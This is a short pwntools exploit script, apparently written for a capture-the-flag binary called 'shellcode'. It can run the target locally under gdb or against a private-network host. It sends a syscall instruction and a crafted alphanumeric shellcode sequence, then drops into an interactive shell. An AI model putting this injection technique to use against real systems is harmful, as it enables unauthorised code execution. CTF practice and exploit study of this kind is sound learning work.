from pwn import * 
from pwn import p64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./shellcode")
    
else:
    host = "192.168.0.111:62338"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = gdb.debug("./shellcode",'b main')

    pass
# 0x55d3bfc04438 0x55d3bfc044f2 distance 0xba
r.send(asm('syscall'))
time.sleep(1)

pause()
# r.send(b'S' +b'X'+ b'Z'*2 + b'Y'+ b'S'+b'_' + b'Z'*6 + b'Q' + b'Z'* 10)
r.send(b'Z'*2 +b'Y'+b'Z'*7 + b'QY'*3 + b'Q')
# syscall -> rcx Y




# elf = ELF('./pwn')

r.interactive()
